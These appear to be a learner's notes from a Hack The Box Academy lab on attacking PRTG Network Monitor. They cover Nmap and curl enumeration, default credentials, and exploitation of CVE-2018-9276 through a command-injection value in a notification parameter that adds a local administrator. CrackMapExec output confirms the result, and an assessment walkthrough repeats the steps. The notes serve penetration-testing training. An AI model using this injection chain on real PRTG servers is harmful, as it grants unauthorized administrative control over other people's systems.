---
description: >-
  Agentless network monitor to monitor bandwidth usage, uptime and collect
  statistics from various hosts, including routers, switches, servers, and more.
---

# PRTG Network Monitor

## Intro

* PRTG was released, restricted to 100 sensors that can be used to monitor up to 20 hosts
* It works with an autodiscovery mode to scan areas of a network and create a device list
* it can gather further information from the detected devices using protocols such as ICMP, SNMP, WMI, NetFlow, and more
* Devices can also communicate with the tool via a REST API
* The software runs entirely from an AJAX-based website, but there is a desktop application available for Windows, Linux, and macOS
*

## Discovery/Footprinting/Enumeration

**discover PRTG from an Nmap scan**

```shell-session
sudo nmap -sV -p- --open -T4 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.06% done
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 65492 closed ports, 24 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  ssl/http      Splunkd httpd
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp  open  ssl/http      Splunkd httpd
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.17 seconds
```

typically found on common web ports such as 80, 443, or 8080.

we can see the service `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` detected on port 8080.

PRTG also shows up in the EyeWitness scan we performed earlier. Here we can see that EyeWitness lists the default credentials `prtgadmin:prtgadmin`.( pre-filled login )

![EyeWitness](https://academy.hackthebox.com/storage/modules/113/prtg\_eyewitness.png)

Once we have discovered PRTG, we can confirm by browsing to the URL and are presented with the login page.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/prtg_login.png" alt=""><figcaption><p>http://10.129.201.50:8080/index.htm</p></figcaption></figure>

it seems to be PRTG version `17.3.33.2830` and is likely vulnerable to [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276) which is an authenticated command injection

Using `cURL` we can see that the version number is indeed `17.3.33.283`.

```shell-session
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version

  <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
    <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>
```

<figure><img src="https://academy.hackthebox.com/storage/modules/113/prtg_logged_in.png" alt=""><figcaption><p><code>prtgadmin:Password123</code></p></figcaption></figure>

### Leveraging Known Vulnerabilities

This excellent [blog post](https://www.codewatch.org/blog/?p=453) by the individual who discovered this flaw does a great job of walking through the initial discovery process and how they discovered it.

When creating a new notification, the `Parameter` field is passed directly into a PowerShell script without any type of input sanitization.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/prtg_notifications.png" alt=""><figcaption><p>Setup > Account Settings > Notifications</p></figcaption></figure>

<figure><img src="https://academy.hackthebox.com/storage/modules/113/prtg_add.png" alt=""><figcaption><p><code>Add new notification</code></p></figcaption></figure>

* Scroll down and tick EXECUTE PROGRAM
* Program File -> select `Demo exe notification - outfile.ps1`

we will add a new local admin user by entering `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`.

![edit settings](https://academy.hackthebox.com/storage/modules/113/prtg\_execute.png)

then click Save and we will be redirectoed to Notifications

<figure><img src="https://academy.hackthebox.com/storage/modules/113/prtg_pwn.png" alt=""><figcaption><p>New notification (pwn)</p></figcaption></figure>

click the `Test` button to run our notification and execute the command to add a local admin user. we will get a pop-up that says `EXE notification is queued up`.

Since this is a blind command execution, we won't get any feedback, so we'd have to either check our listener for a connection back or, in our case, check to see if we can authenticate to the host as a local admin.

We can use `CrackMapExec` to confirm local admin access. We could also try to RDP to the box, access over WinRM, or use a tool such as [evil-winrm](https://github.com/Hackplayers/evil-winrm) or something from the [impacket](https://github.com/SecureAuthCorp/impacket) toolkit such as `wmiexec.py` or `psexec.py`.

```shell-session
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 

SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

## Assessment

What version of PRTG is running on the target?

```
sudo nmap 10.129.249.52 -sV -T4                                                  
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-13 04:36 EDT
Nmap scan report for 10.129.249.52
Host is up (0.22s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8000/tcp open  ssl/http      Splunkd httpd
8080/tcp open  http          Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.57 seconds

```

_**18.1.37.13946**_

Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop

login using `prtgadmin:Password123`

<figure><img src="../../../.gitbook/assets/ภาพ (16).png" alt=""><figcaption><p><code>test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add</code></p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/ภาพ (14).png" alt=""><figcaption><p>click the bell icon</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/ภาพ (15).png" alt=""><figcaption><p>done</p></figcaption></figure>

```
sudo crackmapexec smb 10.129.249.52 -u prtgadm1 -p Pwn3d_by_PRTG! 
SMB         10.129.249.52   445    APP03            [*] Windows 10.0 Build 17763 x64 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.249.52   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

